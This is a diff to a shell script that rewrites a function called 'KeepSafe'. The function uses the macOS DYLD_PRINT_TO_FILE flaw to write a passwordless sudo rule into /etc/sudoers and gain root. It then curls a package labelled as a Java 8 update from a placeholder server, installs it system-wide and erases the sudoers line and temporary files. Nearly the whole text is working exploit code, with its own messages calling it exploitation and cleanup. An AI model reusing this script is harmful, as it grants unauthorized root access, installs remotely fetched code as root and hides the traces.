@@ -23,9 +23,54 @@ echo 'Created by:'
 echo 'Patrick Hart & Zachery Rayburn'
 echo;echo
 
+function KeepSafe {
 echo -e '\033[1mExploiting machine...\033[0m'
 echo
-function KeepSafe {
-  echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash -c 'time if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)"; else sudo mkdir -v /tmp$$; echo;echo; echo -e "\033[1mcURLing Java 8 Update 60.pkg...\033[0m"; sudo curl -# http://<SERVER_ADDRESS>/Java_8_Update_60.pkg > /temp$$/Java_8_Update_60.pkg; echo -e "\033[1mDone.\033[0m"; echo;echo; "\033[1mInstalling packages...\033[0m"; sudo installer -verbose -pkg /tmp$$/Java_8_Update_60.pkg -target LocalSystem; echo; echo -e "\033[1mDone.\033[0m"; echo;echo; echo -e "\033[1mCleaning up exploited machine...\033[0m"; echo;echo; sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers; echo -e "\033[1mRemoving temporary files and directories...\033[0m"; echo -e "\033[1mRemoved: \033[0m"; rm -rfv /tmp$$; echo;echo; echo -e "\033[1mCompleted successfully.\033[0m"; fi; exit 0'
+
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'INJECTINTOBASH'
+#!/bin/bash
+#--- CHECK FOR ROOT ---#
+  if [[ $EUID -ne 0 ]]
+  then
+    echo -e "\033[1mFailed! No root!\033[0m"
+    exit 1
+  else
+#--- MAKE A TEMPORARY DIRECTORY WITH UNIQUE PID ---#
+    sudo mkdir -v /tmp$$/
+
+    echo;echo
+
+#--- DOWNLOAD THE PACKAGE ---#
+    echo -e "\033[1mcURLing Java_8_Update_60.pkg...\033[0m"
+    sudo curl -# http://<SERVER_ADDRESS>/Java_8_update_60.pkg -o /tmp$$/Java_8_Update_60.pkg
+    echo -e "\033[1mDone.\033[0m"
+
+    echo;echo
+
+#--- INSTALL THE PACKAGE ---#
+    echo -e "\033[1mInstalling packages...\033[0m"
+    sudo installer -verbose -pkg /tmp$$/Java_8_Update_60.pkg -target LocalSystem
+    echo -e "\033[1mDone.\033[0m"
+
+    echo;echo
+
+    echo -e "\033[1mCleaning up exploited machine...\033[0m"
+
+    echo;echo
+
+#--- REMOVE THE LINE GRANTING ROOT ACCESS ---#
+    sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers
+#--- REMOVE TEMPORARY DIRECTORY ---#
+    echo -e "\033[1mRemoving temporary files and directories...\033[0m"
+    echo -e "\033[1mRemoved: \033[0m"
+    rm -rfv /tmp$$
+
+    echo;echo
+
+    echo -e "\033[1mCompleted successfully.\033[0m"
+  fi
+  exit 0
+INJECTINTOBASH
 }
+#--- MAKE SURE WE SUCCEED ---#
 trap KeepSafe exit
